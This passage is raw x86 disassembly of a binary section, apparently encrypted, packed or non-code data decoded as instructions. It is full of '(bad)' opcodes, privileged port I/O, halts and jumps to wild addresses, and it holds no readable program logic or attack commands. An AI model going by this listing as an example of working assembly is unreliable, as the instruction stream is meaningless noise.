  41c565:	jmp    0x41c55f
  41c567:	jmp    0x41c52e
  41c569:	or     edi,edi
  41c56b:	inc    esp
  41c56d:	stos   BYTE PTR es:[edi],al
  41c56e:	sar    BYTE PTR [esi-0xc2b3331],1
  41c574:	int3   
  41c575:	cli    
  41c576:	fmul   st,st(7)
  41c578:	rol    ah,cl
  41c57a:	out    dx,eax
  41c57b:	shr    ebp,1
  41c57d:	mov    edx,0xbaf9fbf0
  41c582:	or     eax,DWORD PTR [edi+eax*1]
  41c585:	or     dl,bh
  41c587:	call   0xfa22a571
  41c58c:	retf   0xe3a6
  41c58f:	mov    esi,0xb4ccc1c7
  41c594:	leave  
  41c595:	out    0xee,al
  41c597:	out    0xfe,al
  41c599:	test   al,0xd3
  41c59c:	mov    edx,0xd9f802f1
  41c5a1:	ret    
  41c5a2:	jecxz  0x41c57d
  41c5a4:	shr    edx,0xe8
  41c5a7:	add    DWORD PTR [ecx],ecx
  41c5a9:	cli    
  41c5aa:	add    ecx,DWORD PTR ds:0xf0f6d0e7
  41c5b0:	shr    ebx,1
  41c5b2:	shr    cl,1
  41c5b4:	(bad)  
  41c5b5:	fdiv   st,st(0)
  41c5b7:	aad    0xcb
  41c5b9:	mov    esi,0xedd0cfea
  41c5be:	pop    es
  41c5bf:	rol    ebp,0xf1
  41c5c2:	test   DWORD PTR [ecx],0xe0e003c0
  41c5c8:	sti    
  41c5c9:	int3   
  41c5ca:	in     al,0x1
  41c5cc:	in     eax,0xe1
  41c5ce:	jmp    0xf1ce:0xf3c1f1c5
  41c5d5:	in     eax,0xb1
  41c5d7:	int3   
  41c5d8:	iret   
  41c5d9:	in     al,dx
  41c5da:	fmulp  st(6),st
  41c5dc:	add    bl,al
  41c5de:	repz mov edi,0xb8f7e406
  41c5e4:	jmp    0x41c5af
  41c5e6:	jmp    0xee01:0xe5dec5f4
  41c5ed:	fucomip st,st(3)
  41c5ef:	xlat   BYTE PTR ds:[ebx]
  41c5f0:	mov    ch,0xd2
  41c5f2:	lods   al,BYTE PTR ds:[esi]
  41c5f3:	int    0xc5
  41c5f5:	cli    
  41c5f6:	aad    0xb8
  41c5f8:	(bad)  
  41c5fa:	int3   
  41c5fb:	fcos   
  41c5fd:	rol    DWORD PTR [esi],0xec
  41c600:	mov    esi,0xe1c6d9bd
  41c605:	add    esp,ecx
  41c607:	jmp    0xe210b30f
  41c60c:	scas   al,BYTE PTR es:[edi]
  41c60d:	in     eax,dx
  41c60e:	mul    ecx
  41c610:	into   
  41c611:	iret   
  41c612:	loopne 0x41c602
  41c614:	out    0xc0,al
  41c616:	out    0xee,eax
  41c618:	mov    ebp,0xe3b4c3ed
  41c61d:	(bad)  
  41c61e:	loop   0x41c5d8
  41c620:	(bad)  
  41c622:	pop    es
  41c623:	add    al,0xe1
  41c625:	jmp    0xefc8:0xfcd8dcc8
  41c62c:	out    0xf3,eax
  41c62e:	mov    al,0xe9
  41c630:	repz jmp 0xc4ce:0xdfdbb4c5
  41c638:	mov    dh,0xed
  41c63a:	(bad)  
  41c63b:	fdiv   st,st(7)
  41c63d:	stc    
  41c63e:	call   esi
  41c640:	push   es
  41c641:	div    cl
  41c643:	lds    eax,FWORD PTR [edi]
  41c645:	(bad)
  41c648:	push   es
  41c649:	out    dx,eax
  41c64a:	ror    DWORD PTR [eax],cl
  41c64c:	in     al,dx
  41c64d:	repz mov bl,0xd2
  41c650:	ror    esi,0xcf
  41c653:	icebp  
  41c654:	aad    0xb8
  41c656:	mov    edx,0xcdc8cfc5
  41c65b:	add    edi,eax
  41c65d:	out    0xec,eax
  41c65f:	icebp  
  41c660:	cld    
  41c661:	in     al,dx
  41c662:	add    BYTE PTR [esi],al
  41c664:	jmp    0x6cf:0xe3ffe00f
  41c66b:	or     DWORD PTR [ebx-0x8523524],esi
  41c671:	jecxz  0x41c640
  41c673:	mov    bl,0xf3
  41c675:	xlat   BYTE PTR ds:[ebx]
  41c676:	mov    ch,0xff
  41c678:	mov    eax,0xc2becdf5
  41c67d:	add    ch,ch
  41c67f:	fadd   DWORD PTR ds:0x3cbc1ec
  41c685:	add    al,0x0
  41c687:	in     al,0xdd
  41c689:	mov    BYTE PTR [esi],0x8
  41c68c:	(bad)
  41c68f:	mov    esp,0xd1fae0d7
  41c694:	retf   0xb4ec
  41c697:	rcl    al,cl
  41c699:	repnz hlt 
  41c69b:	out    dx,eax
  41c69c:	idiv   dl
  41c69e:	mov    ch,0xd2
  41c6a0:	add    eax,0x4d9e3be
  41c6a5:	(bad)  
  41c6a6:	loop   0x41c6a3
  41c6a8:	push   cs
  41c6a9:	out    dx,eax
  41c6aa:	out    dx,al
  41c6ab:	adc    ecx,ebx
  41c6ad:	shl    BYTE PTR [edi-0xe0a341a],cl
  41c6b3:	(bad)  
  41c6b5:	hlt    
  41c6b6:	aad    0xbf
  41c6b8:	in     al,0xea
  41c6ba:	test   dl,0xe1
  41c6bd:	int3   
  41c6be:	sti    
  41c6bf:	fild   DWORD PTR [esi]
  41c6c1:	loopne 0x41c67c
  41c6c3:	repnz mov edi,0x8c4d5c4
  41c6ca:	repz les ebp,FWORD PTR [edi-0x193b4f50]
  41c6d1:	mov    bl,0xef
  41c6d3:	rcl    ebp,0xf6
  41c6d6:	mov    ah,0xf7
  41c6d9:	mov    esi,0xfbcebcbe
  41c6de:	add    dl,al
  41c6e0:	jmp    eax
  41c6e2:	add    al,0xf1
  41c6e4:	mov    BYTE PTR [eax],0xf6
  41c6e7:	test   dl,0xc5
  41c6ea:	cld    
  41c6eb:	fldcw  WORD PTR [edi-0x17104820]
  41c6f1:	rcr    ebx,cl
  41c6f3:	in     eax,dx
  41c6f4:	xlat   BYTE PTR ds:[ebx]
  41c6f5:	mov    eax,0xcfe4f9ec
  41c6fa:	mov    esi,0xddc0dedc
  41c6ff:	(bad)  
  41c701:	sti    
  41c702:	jecxz  0x41c702
  41c704:	loope  0x41c6ca
  41c706:	loopne 0x41c6e2
  41c708:	aam    0xce
  41c70a:	enter  0xa7c4,0xca
  41c70e:	jmp    0xc72984e1
  41c713:	out    dx,al
  41c714:	scas   eax,DWORD PTR es:[edi]
  41c715:	mov    ch,0xbb
  41c717:	jmp    0xf5d0:0xe2d5bcea
  41c71e:	int    0xdb
  41c720:	fadd   st(4),st
  41c722:	add    eax,ebx
  41c724:	add    BYTE PTR [edx],cl
  41c726:	cld    
  41c727:	or     ebx,eax
  41c729:	fsubp  st(3),st
  41c72b:	(bad)  
  41c72c:	fmul   st,st(4)
  41c72e:	imul   edx
  41c730:	ret    
  41c731:	stos   BYTE PTR es:[edi],al
  41c732:	in     eax,0xf1
  41c734:	clc    
  41c735:	into   
  41c736:	(bad)  
  41c738:	icebp  
  41c739:	mov    esp,0xccffeaf2
  41c73e:	mov    esp,0xc2d8e7ec
  41c743:	or     dl,cl
  41c745:	aam    0xf8
  41c747:	or     BYTE PTR [edx],al
  41c749:	add    al,cl
  41c74b:	icebp  
  41c74c:	retf   0xcec8
  41c74f:	lds    esi,FWORD PTR [ecx-0x1a081520]
  41c755:	repz in al,0xc4
  41c758:	sar    eax,cl
  41c75a:	in     eax,dx
  41c75b:	ret    0xecf7
  41c75e:	fcom   st(6)
  41c760:	hlt    
  41c761:	imul   dl
  41c763:	loop   0x41c73a
  41c765:	fcomi  st,st(7)
  41c767:	fsubr  st(0),st
  41c769:	or     eax,0xe7f2e2e6
  41c76e:	into   
  41c76f:	ret    0xedc3
  41c772:	lods   eax,DWORD PTR ds:[esi]
  41c773:	aam    0xb0
  41c775:	(bad)  
  41c776:	in     eax,0xc4
  41c778:	clc    
  41c779:	repz test ebp,0xd3eefdf6
  41c780:	rcl    bh,1
  41c782:	in     eax,0xd2
  41c784:	leave  
  41c785:	ret    0x3f4
  41c788:	(bad)  
  41c789:	fstp   st(7)
  41c78b:	or     BYTE PTR [esi+eiz*8-0x312f3611],ch
  41c792:	(bad)  
  41c793:	leave  
  41c794:	mov    edx,0xcceae6f8
  41c799:	out    dx,eax
  41c79a:	cli    
  41c79b:	jmp    0xf6209e77
  41c7a0:	out    0xd7,al
  41c7a2:	mov    ebp,0xdfc9caeb
  41c7a7:	or     eax,0xe5c404ee
  41c7ac:	shr    ah,cl
  41c7ae:	mov    cl,0xdc
  41c7b0:	retf   0xd7b6
  41c7b3:	int3   
  41c7b4:	fptan  
  41c7b6:	out    dx,al
  41c7b7:	repz (bad) [edx-0x1f1f24fe]
  41c7be:	(bad)  
  41c7c0:	mov    ebx,0xf0fedcd5
  41c7c5:	fcmovu st,st(0)
  41c7c7:	cmc    
  41c7c8:	aad    0xe
  41c7ca:	int    0xd8
  41c7cc:	(bad)  
  41c7cd:	fsubr  DWORD PTR [ebp-0x1a292939]
  41c7d3:	mov    bl,0xe1
  41c7d5:	rep lods eax,DWORD PTR ds:[esi]
  41c7d7:	into   
  41c7d8:	iret   
  41c7d9:	jmp    0xbcfa:0xf4f4eaf8
  41c7e0:	rcl    esi,1
  41c7e2:	add    al,0xf5
  41c7e4:	cli    
  41c7e5:	shl    ch,0xca
  41c7e8:	add    BYTE PTR [ecx],cl
  41c7ea:	enter  0xb2cd,0xe2
  41c7ee:	ror    edi,cl
  41c7f0:	leave  
  41c7f1:	lock cmc 
  41c7f3:	shl    esp,cl
  41c7f5:	mov    eax,0xdab6d7ba
  41c7fa:	fucomp st(5)
  41c7fc:	shl    ebx,cl
  41c7fe:	sti    
  41c7ff:	out    dx,al
  41c800:	mov    esp,0xcb0ada03
  41c805:	hlt    
  41c806:	iret   
  41c807:	retf   
  41c808:	std    
  41c809:	in     al,dx
  41c80a:	pop    es
  41c80b:	int3   
  41c80c:	out    0xf1,al
  41c80e:	into   
  41c80f:	jmp    0xdb2a97e3
  41c814:	shr    ch,1
  41c816:	sti    
  41c817:	fsubr  st,st(6)
  41c819:	(bad)  
  41c81b:	clc    
  41c81c:	enter  0xf1b9,0xdc
  41c820:	cli    
  41c821:	add    ecx,esp
  41c823:	ffree  st(1)
  41c825:	cmc    
  41c826:	(bad)  
  41c828:	ud2    
  41c82a:	push   es
  41c82b:	adc    esp,eax
  41c82d:	scas   al,BYTE PTR es:[edi]
  41c82e:	iret   
  41c82f:	loopne 0x41c823
  41c831:	ret    
  41c832:	mov    bh,0xb7
  41c834:	retf   
  41c835:	(bad)  
  41c836:	fnstenv [eax-0x15292945]
  41c83c:	mov    edx,0xfcbeceb6
  41c841:	add    eax,0xf7fd07d5
  41c846:	aad    0xa
  41c848:	enter  0x120c,0x2
  41c84c:	shr    edx,cl
  41c84e:	mov    esi,0xe4aee1a4
  41c853:	in     eax,dx
  41c854:	shr    ch,0xfa
  41c857:	fdivr  st,st(6)
  41c859:	repnz retf 0xf9be
  41c85d:	fcos   
  41c85f:	(bad)  
  41c861:	cmc    
  41c862:	test   BYTE PTR [edx],0xf4
  41c865:	push   es
  41c866:	not    ebp
  41c868:	leave  
  41c869:	clc    
  41c86a:	fsubp  st(4),st
  41c86c:	mov    esi,0xe0c7edad
  41c872:	cmc    
  41c873:	fucomi st,st(6)
  41c875:	shl    cl,cl
  41c877:	mov    dh,0xd9
  41c879:	shl    BYTE PTR [ecx-0x4afc4518],1
  41c87f:	aam    0x3
  41c881:	xlat   BYTE PTR ds:[ebx]
  41c882:	rol    DWORD PTR [edi],0x2
  41c885:	pop    es
  41c886:	(bad)  
  41c887:	add    edi,eax
  41c889:	or     BYTE PTR [esi],cl
  41c88b:	jmp    0xf2eb:0xe8e9c4ed
  41c892:	enter  0xf9e8,0xf7
  41c896:	(bad)  
  41c897:	fnstcw WORD PTR [eax-0x17444b1c]
  41c89d:	mov    edi,0xc0cdd6dd
  41c8a2:	rol    DWORD PTR [edi],cl
  41c8a4:	retf   0xe3fd
  41c8a7:	sti    
  41c8a8:	(bad)  
  41c8aa:	add    ecx,ecx
  41c8ac:	jecxz  0x41c85a
  41c8ae:	mov    cl,0xef
  41c8b0:	retf   0xb1e2
  41c8b3:	(bad)  
  41c8b4:	enter  0xcab5,0xf7
  41c8b8:	in     eax,0xe4
  41c8ba:	sar    edi,1
  41c8bc:	loope  0x41c8aa
  41c8be:	hlt    
  41c8bf:	ret    0x6e5
  41c8c2:	fcom   st(0)
  41c8c4:	idiv   eax
  41c8c6:	add    BYTE PTR [edi],cl
  41c8c8:	fisttp WORD PTR [ebx]
  41c8ca:	fcmovne st,st(2)
  41c8cc:	scas   al,BYTE PTR es:[edi]
  41c8cd:	shl    eax,cl
  41c8cf:	out    dx,eax
  41c8d0:	aam    0xd6
  41c8d2:	(bad)  
  41c8d3:	shr    ecx,cl
  41c8d5:	jmp    0x41c88e
  41c8d7:	mov    ebx,0xf4b5ebe4
  41c8dc:	iret   
  41c8dd:	out    dx,al
  41c8de:	repz (bad) 
  41c8e1:	(bad)  
  41c8e3:	out    0xe1,eax
  41c8e5:	add    eax,0xd4c806fe
  41c8ea:	in     eax,0x4
  41c8ec:	test   al,0xd2
  41c8ee:	(bad)  
  41c8ef:	out    dx,al
  41c8f0:	imul   BYTE PTR [esi-0x491b2f2a]
  41c8f6:	(bad)  
  41c8f7:	in     eax,0xbd
  41c8f9:	cld    
  41c8fa:	enter  0xd6fc,0xd3
  41c8fe:	shl    ebp,1
  41c900:	add    al,0xbe
  41c902:	cld    
  41c903:	not    esi
  41c905:	leave  
  41c906:	hlt    
  41c907:	into   
  41c908:	out    dx,al
  41c909:	or     eax,0xf3c8e0ed
  41c90e:	iret   
  41c90f:	mov    esp,0xb0b0cef4
  41c914:	leave  
  41c915:	lock idiv eax
  41c918:	out    dx,al
  41c919:	(bad)  
  41c91b:	int    0xfd
  41c91d:	mov    ecx,0xfce50700
  41c922:	cli    
  41c923:	loopne 0x41c908
  41c925:	or     bl,ah
  41c927:	or     edi,ecx
  41c929:	(bad)  
  41c92a:	adc    ebx,esp
  41c92c:	shl    ebp,0xc1
  41c92f:	jmp    0x41c904
  41c931:	mov    esp,0xc6b7b5ca
  41c936:	clc    
  41c937:	in     eax,dx
  41c938:	retf   
  41c939:	retf   0xedd7
  41c93c:	into   
  41c93d:	inc    BYTE PTR [edx]
  41c93f:	lock (bad) 
  41c941:	(bad)  
  41c942:	mov    ecx,0xe3cb09f9
  41c947:	loop   0x41c91d
  41c949:	adc    ecx,eax
  41c94b:	icebp  
  41c94c:	leave  
  41c94d:	(bad)  
  41c94f:	mov    dl,0xcd
  41c951:	int3   
  41c952:	retf   
  41c953:	fcmove st,st(1)
  41c955:	repz mov ecx,0xe2f9f3e6
  41c95b:	(bad)  
  41c95c:	add    ah,dh
  41c95e:	rol    BYTE PTR [edx],1
  41c960:	aad    0xd2
  41c962:	vaddsubpd xmm0,xmm2,xmm4
  41c966:	jmp    0xca30d16e
  41c96b:	into   
  41c96c:	into   
  41c96d:	lods   eax,DWORD PTR ds:[esi]
  41c96e:	mov    bh,0xf1
  41c970:	into   
  41c971:	sti    
  41c972:	out    dx,al
  41c973:	loope  0x41c925
  41c975:	mov    dh,0xb0
  41c977:	mov    edi,0xc8f7b8f6
  41c97c:	(bad)  
  41c97d:	add    bh,bl
  41c97f:	test   DWORD PTR [edx],0xe5f5cbc2
  41c985:	loope  0x41c98f
  41c987:	add    eax,esi
  41c989:	in     eax,0xb
  41c98b:	fisubr WORD PTR [ebx-0x1f14501b]
  41c991:	iret   
  41c992:	repnz leave 
  41c994:	fcmovnbe st,st(6)
  41c996:	(bad)  
  41c997:	(bad)  
  41c999:	jmp    0xdd167a75
  41c99e:	(bad)  
  41c9a0:	loopne 0x41c979
  41c9a2:	retf   
  41c9a3:	mul    ch
  41c9a5:	fcmovu st,st(1)
  41c9a7:	(bad)  
  41c9a8:	push   cs
  41c9a9:	in     al,dx
  41c9aa:	out    dx,eax
  41c9ab:	(bad)  
  41c9ac:	int    0xe0
  41c9ae:	ret    
  41c9af:	mov    cl,0xcd
  41c9b1:	in     eax,0xeb
  41c9b3:	(bad)  
  41c9b6:	mov    ecx,0xd6baced6
  41c9bb:	inc    dl
  41c9bd:	(bad)  
  41c9bf:	loope  0x41c98d
  41c9c1:	mov    ebp,0xfb00e6fe
  41c9c6:	sti    
  41c9c7:	sti    
  41c9c8:	or     ebx,eax
  41c9ca:	loop   0x41c9ca
  41c9cc:	shr    ch,0xaf
  41c9cf:	shl    BYTE PTR [edi-0x848443c],0xd1
  41c9d6:	(bad)  
  41c9d8:	repnz icebp 
  41c9da:	cmc    
  41c9db:	out    dx,al
  41c9dc:	mov    edx,0xd0bfd1da
  41c9e1:	(bad)  
  41c9e2:	retf   
  41c9e3:	imul   edx
  41c9e5:	(bad)  
  41c9e7:	loope  0x41c9f4
  41c9e9:	(bad)  
  41c9ea:	out    0xdd,al
  41c9ec:	shr    DWORD PTR [edi-0x3d232e3b],cl
  41c9f2:	fcmovbe st,st(3)
  41c9f4:	mov    bl,0xee
  41c9f6:	in     eax,dx
  41c9f7:	enter  0xf4dc,0xcd
  41c9fb:	mov    edx,0xbcdfb6dc
  41ca00:	icebp  
  41ca01:	(bad)  
  41ca03:	cld    
  41ca04:	ret    0xe8ef
  41ca07:	cli    
  41ca08:	add    ch,bh
  41ca0a:	(bad)  
  41ca0b:	in     al,dx
  41ca0c:	(bad)  
  41ca0d:	retf   0xede8
  41ca10:	xlat   BYTE PTR ds:[ebx]
  41ca11:	out    0xf5,eax
  41ca13:	rcr    al,cl
  41ca15:	mov    ecx,0xeeeddae8
  41ca1a:	aam    0xb4
  41ca1c:	cld    
  41ca1d:	(bad)  
  41ca1e:	pop    es
  41ca1f:	out    0x0,al
  41ca21:	mov    esi,0xe0bf0bdb
  41ca26:	vpavgw ymm0,ymm5,YMMWORD PTR [esi]
  41ca2a:	or     al,0xe6
  41ca2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca2d:	shr    DWORD PTR [esi-0x4b37113d],cl
  41ca33:	in     eax,0xe1
  41ca35:	mov    ah,0xe8
  41ca37:	in     eax,0xbb
  41ca39:	aam    0xdf
  41ca3b:	fadd   st,st(3)
  41ca3d:	out    0xfc,eax
  41ca3f:	loopne 0x41ca40
  41ca41:	out    0x5,eax
  41ca43:	retf   
  41ca44:	cli    
  41ca45:	(bad)  
  41ca47:	iret   
  41ca48:	retf   0xf9cb
  41ca4b:	sar    DWORD PTR [ecx-0x43082f1f],cl
  41ca51:	in     al,dx
  41ca52:	in     al,0xb4
  41ca54:	stc    
  41ca55:	(bad)  
  41ca56:	shl    dh,cl
  41ca58:	mov    edi,0xd7ffdcf1
  41ca5d:	mul    bh
  41ca5f:	fdivr  st(3),st
  41ca61:	mov    edx,0xe5e9f1d0
  41ca66:	std    
  41ca67:	push   cs
  41ca68:	jmp    0x41ca63
  41ca6a:	lds    eax,FWORD PTR [eax]
  41ca6c:	repz (bad) 
  41ca6f:	loopne 0x41ca48
  41ca71:	shl    edi,cl
  41ca73:	repnz into 
  41ca75:	int3   
  41ca76:	in     eax,0xd2
  41ca78:	dec    bh
  41ca7a:	aad    0xbf
  41ca7c:	inc    BYTE PTR [edx]
  41ca7e:	out    dx,eax
  41ca7f:	ret    0xe0c0
  41ca82:	(bad)  
  41ca84:	(bad)  
  41ca85:	fimul  WORD PTR [edx]
  41ca87:	add    dl,ch
  41ca89:	leave  
  41ca8a:	sti    
  41ca8b:	fsub   st(1),st
  41ca8d:	iret   
  41ca8e:	int3   
  41ca8f:	mov    bh,0xdc
  41ca91:	repz mul ebp
  41ca94:	(bad)  
  41ca95:	in     eax,0xec
  41ca97:	(bad)  
  41ca98:	(bad)  
  41ca99:	shl    bl,1
  41ca9b:	hlt    
  41ca9c:	cld    
  41ca9d:	mov    esp,0xfaccf0b5
  41caa2:	fiadd  DWORD PTR [edx]
  41caa4:	icebp  
  41caa5:	enter  0xcfc5,0xfb
  41caa9:	ret    0xe2cf
  41caac:	mov    ebp,0xb0c8b3e1
  41cab1:	retf   
  41cab2:	rol    esp,1
  41cab4:	shl    BYTE PTR [ebp-0x2a42092a],cl
  41caba:	rcl    bh,1
  41cabc:	mov    esi,0x2d0f4fa
  41cac1:	shl    edx,0xd1
  41cac4:	mov    edi,0xfff9d70a
  41cac9:	add    eax,0xc5b3cb01
  41cace:	fsubp  st(6),st
  41cad0:	xlat   BYTE PTR ds:[ebx]
  41cad1:	rcl    bl,0xee
  41cad4:	mov    ch,0xc4
  41cad6:	mov    ah,0xdb
  41cad8:	lock leave 
  41cada:	bnd ret 0xd1fc
  41cade:	repnz add BYTE PTR [edi+esi*8],al
  41cae2:	repz (bad) 
  41cae4:	jecxz  0x41cabe
  41cae6:	out    0xc6,al
  41cae8:	call   0xe822b6da
  41caed:	into   
  41caee:	in     eax,dx
  41caef:	mov    bh,0xca
  41caf1:	mov    dl,0xed
  41caf3:	hlt    
  41caf4:	jmp    0x41caac
  41caf6:	xlat   BYTE PTR ds:[ebx]
  41caf7:	icebp  
  41caf8:	(bad)  
  41caf9:	xlat   BYTE PTR ds:[ebx]
  41cafa:	not    cl
  41cafc:	mov    edx,0xc3f1db00
  41cb01:	ret    0xd2fa
  41cb04:	out    0xda,al
  41cb06:	push   cs
  41cb07:	out    0xfa,al
  41cb09:	int    0x0
  41cb0b:	call   0xce3994f5
  41cb10:	retf   0xc2c4
  41cb13:	mov    bl,0xec
  41cb15:	cmc    
  41cb16:	call   esp
  41cb18:	retf   
  41cb19:	out    dx,al
  41cb1a:	dec    ecx
  41cb1c:	repnz clc 
  41cb1e:	aam    0xed
  41cb20:	xlat   BYTE PTR ds:[ebx]
  41cb21:	fnstsw WORD PTR [edx+esi*8-0x1303d2b]
  41cb28:	in     al,dx
  41cb29:	int    0xca
  41cb2b:	imul   ebx,edi
  41cb2e:	lods   eax,DWORD PTR ds:[esi]
  41cb2f:	rol    bh,0xc0
  41cb32:	loopne 0x41caf5
  41cb34:	enter  0xe8da,0xcd
  41cb38:	(bad)
  41cb3b:	enter  0xbebc,0xc3
  41cb3f:	add    eax,ecx
  41cb41:	xlat   BYTE PTR ds:[ebx]
  41cb42:	mov    ebp,0xdc03f0d2
  41cb47:	add    al,0xfb
  41cb49:	int    0xdf
  41cb4b:	shr    DWORD PTR [ebp-0xe3a2331],cl
  41cb51:	mov    ch,0xc8
  41cb53:	rcl    dl,cl
  41cb55:	call   0x41e9a2b
  41cb5a:	sti    
  41cb5b:	mov    al,0xd7
  41cb5d:	mov    ebp,0xc7dbf4e7
  41cb62:	add    edx,esp
  41cb64:	in     eax,0x5
  41cb66:	iret   
  41cb67:	(bad)
  41cb6b:	or     al,ah
  41cb6d:	shr    DWORD PTR [eax-0xd294920],1
  41cb73:	mov    cl,0xf6
  41cb75:	(bad)
  41cb78:	repz in al,0xf1
  41cb7b:	sti    
  41cb7c:	idiv   DWORD PTR [eax+0x5ffbef3]
  41cb82:	cmc    
  41cb83:	add    al,0xe2
  41cb85:	add    eax,0xfddf0409
  41cb8a:	add    eax,0xadf2ebcb
  41cb8f:	out    0xb2,eax
  41cb91:	leave  
  41cb92:	mov    cl,0xc4
  41cb95:	test   edi,0xd2efdef0
  41cb9b:	repnz into 
  41cb9d:	mov    esp,0xe2c7fec7
  41cba2:	jmp    0x41cb94
  41cba4:	leave  
  41cba5:	pmovmskb edi,mm0
  41cba8:	(bad)  
  41cbaa:	fld    DWORD PTR [eax]
  41cbac:	fsubr  st(4),st
  41cbae:	leave  
  41cbaf:	fdivr  st(1),st
  41cbb1:	jmp    0xc91bc55f
  41cbb6:	cmc    
  41cbb7:	(bad)  
  41cbb8:	lock in al,dx
  41cbba:	sar    ch,cl
  41cbbc:	fcomp  st(0)
  41cbbe:	std    
  41cbbf:	repnz icebp 
  41cbc1:	sar    edi,1
  41cbc3:	loope  0x41cb84
  41cbc5:	add    BYTE PTR [ecx],cl
  41cbc7:	(bad)  
  41cbc8:	(bad)  
  41cbca:	jmp    0xf3d1:0xf0c2b30f
  41cbd1:	cmc    
  41cbd2:	jmp    0x41cbc5
  41cbd4:	clc    
  41cbd5:	mov    dh,0xcc
  41cbd7:	clc    
  41cbd8:	mov    edx,0xcebed603
  41cbdd:	int    0xdc
  41cbdf:	fsubrp st(1),st
  41cbe1:	aam    0xdd
  41cbe3:	std    
  41cbe4:	mov    edi,0xda0206eb
  41cbe9:	add    ebx,ebx
  41cbeb:	leave  
  41cbec:	ret    
  41cbed:	mov    edi,0xc7e6c5ae
  41cbf2:	shl    ch,0xcf
  41cbf5:	mov    edx,0xd0e4fbd6
  41cbfa:	(bad)  
  41cbfb:	(bad)  
  41cbfc:	cli    
  41cbfd:	cli    
  41cbfe:	jecxz  0x41cbe1
  41cc00:	std    
  41cc01:	(bad)  
  41cc02:	hlt    
  41cc03:	or     DWORD PTR ds:0xe6f5dcfc,eax
  41cc09:	faddp  st(5),st
  41cc0b:	jmp    0xb1e9:0xa4ddefbd
  41cc12:	lock mov bh,0xd4
  41cc15:	fnstenv [esi-0x104d4918]
  41cc1b:	jecxz  0x41cc1c
  41cc1d:	add    cl,ah
  41cc1f:	fnclex 
  41cc21:	std    
  41cc22:	fcomp  st(5)
  41cc24:	retf   
  41cc25:	cli    
  41cc26:	add    eax,0xc1ffe4e5
  41cc2b:	fmul   st(3),st
  41cc2d:	fdiv   QWORD PTR [ebx-0x8493031]
  41cc33:	in     al,0xcc
  41cc35:	(bad)  
  41cc36:	idiv   BYTE PTR [ecx-0x114a2c45]
  41cc3c:	add    cl,al
  41cc3e:	xlat   BYTE PTR ds:[ebx]
  41cc3f:	out    0xd6,eax
  41cc41:	icebp  
  41cc42:	idiv   bl
  41cc44:	add    al,0xdd
  41cc46:	shl    ecx,0x9
  41cc49:	jmp    0x41cc4b
  41cc4b:	or     ah,bl
  41cc4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc4e:	idiv   DWORD PTR [edi+eiz*8-0x133a3536]
  41cc55:	out    dx,eax
  41cc56:	out    dx,eax
  41cc57:	iret   
  41cc58:	fdiv   DWORD PTR [esi+esi*8-0x103d47fe]
  41cc5f:	in     eax,dx
  41cc60:	std    
  41cc61:	mov    edx,0xf7e4bcf4
  41cc66:	retf   0xc90a
  41cc69:	out    dx,al
  41cc6a:	or     al,0xff
  41cc6c:	shl    dl,cl
  41cc6e:	rcl    eax,0xe4
  41cc71:	call   0xf6f1b128
  41cc76:	sti    
  41cc77:	(bad)
  41cc7a:	repnz add ebp,ebx
  41cc7d:	out    0xdf,eax
  41cc7f:	cmc    
  41cc80:	dec    BYTE PTR [ebx]
  41cc82:	out    0xe0,eax
  41cc84:	jmp    0x32aa74e
  41cc89:	into   
  41cc8a:	rcr    ecx,cl
  41cc8c:	repnz scas al,BYTE PTR es:[edi]
  41cc8e:	loopne 0x41cc5c
  41cc90:	stos   DWORD PTR es:[edi],eax
  41cc91:	bnd jmp 0x41cc8a
  41cc94:	vpsubw ymm5,ymm2,YMMWORD PTR [ecx+esi*8-0x1d262911]
  41cc9d:	iret   
  41cc9e:	mov    ecx,0x6fefe03
  41cca3:	fisttp QWORD PTR [ecx]
  41cca5:	push   es
  41cca6:	neg    ah
  41cca8:	hlt    
  41cca9:	cli    
  41ccaa:	jecxz  0x41cc78
  41ccac:	sar    DWORD PTR [eax+esi*8-0x122b4240],1
  41ccb3:	ret    0xe4ec
  41ccb6:	les    esi,FWORD PTR [edi+edi*4-0x411d2a47]
  41ccbd:	fneni(8087 only) 
  41ccbf:	rcl    ebx,1
  41ccc1:	fcmovnb st,st(0)
  41ccc3:	in     eax,0xd7
  41ccc5:	rcr    dl,0xe6
  41ccc8:	out    0x9,eax
  41ccca:	add    esi,ebp
  41cccc:	leave  
  41cccd:	loopne 0x41cca2
  41cccf:	in     eax,dx
  41ccd0:	loop   0x41cca2
  41ccd2:	sti    
  41ccd3:	out    dx,al
  41ccd4:	in     eax,0xea
  41ccd6:	in     al,dx
  41ccd7:	std    
  41ccd8:	enter  0xf8f8,0xf4
  41ccdc:	add    ah,dl
  41ccde:	mov    eax,0xd9f5bbfe
  41cce3:	hlt    
  41cce4:	icebp  
  41cce5:	test   DWORD PTR [esi],0xe9c20402
  41cceb:	enter  0xe4ab,0xb3
  41ccef:	xlat   BYTE PTR ds:[ebx]
  41ccf0:	shl    DWORD PTR [edi-0x16264c19],0xef
  41ccf7:	leave  
  41ccf8:	std    
  41ccf9:	rcr    ch,cl
  41ccfb:	ret    
  41ccfc:	fsubr  st,st(6)
  41ccfe:	sar    DWORD PTR [esi-0x3272c28],1
  41cd04:	aad    0xe4
  41cd06:	cli    
  41cd07:	(bad)  
  41cd08:	jecxz  0x41cce7
  41cd0a:	loopne 0x41cccc
  41cd0c:	fmul   st(6),st
  41cd0e:	(bad)  
  41cd0f:	into   
  41cd10:	hlt    
  41cd11:	aam    0xea
  41cd13:	idiv   DWORD PTR [edx-0x312f0b20]
  41cd19:	mov    edx,0xfff7f4d8
  41cd1e:	mov    ecx,0xbcdeece5
  41cd23:	mov    esp,0xd9e404e5
  41cd28:	or     esp,ecx
  41cd2a:	in     eax,dx
  41cd2b:	clc    
  41cd2c:	shr    edx,1
  41cd2e:	shr    al,0xdc
  41cd31:	mov    cl,0xcc
  41cd33:	into   
  41cd34:	icebp  
  41cd35:	out    dx,eax
  41cd36:	enter  0xfdd9,0xc8
  41cd3a:	mov    edi,0xf401fce2
  41cd3f:	sar    BYTE PTR [ecx+esi*8-0x231b3c0d],1
  41cd46:	cld    
  41cd47:	cli    
  41cd48:	loop   0x41cd4c
  41cd4a:	std    
  41cd4b:	add    ebp,ecx
  41cd4d:	xlat   BYTE PTR ds:[ebx]
  41cd4e:	loopne 0x41cd3f
  41cd50:	hlt    
  41cd51:	iret   
  41cd52:	(bad)
  41cd55:	hlt    
  41cd56:	(bad)
  41cd59:	retf   0xfcfb
  41cd5c:	loope  0x41cd56
  41cd5e:	push   es
  41cd5f:	(bad)  
